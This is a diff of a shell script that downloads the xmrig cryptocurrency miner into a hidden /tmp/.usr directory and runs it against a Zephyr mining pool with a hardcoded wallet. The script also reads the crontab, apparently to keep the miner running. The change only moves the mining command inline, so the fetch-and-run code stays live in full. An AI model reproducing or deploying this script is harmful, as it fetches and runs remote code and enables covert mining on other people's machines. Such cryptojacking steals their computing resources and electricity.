@@ -14,7 +14,7 @@ ROOT_path="/tmp/.usr"
 wallet="ZEPHs6nHn1AJsdkqaZdUioNb7DnFNmcbXGuarcPSGGis7HBV7ZmeewCbUAVDwpGsiWGDyzUCVrcPLCMe6Sjd4V48Xu4FoLvTYRr"
 xmrig_url="https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-21-2/xmrig-6.21.2-linux-static-x64.tar.gz"
 random_number=$(shuf -i 10000000-99999999 -n 1)
-command="./xmrig --coin zephyr --url 'zeph.kryptex.network:8888' --user '$wallet/$random_number' --tls -k"
+command=""
 existing_crontab=$(crontab -l 2>/dev/null)
 
 
@@ -51,7 +51,7 @@ cd "$ROOT_path" || handle_error "无法切换到目录: $ROOT_path"
 wget -O "xmrig.tar.gz" "$xmrig_url"
 tar -xzf "xmrig.tar.gz" -C "$ROOT_path"
 chmod +x "$ROOT_path/xmrig"
-$command
+./xmrig --coin zephyr --url 'zeph.kryptex.network:8888' --user '$wallet/$random_number' --tls -k
 sleep 10
 
 
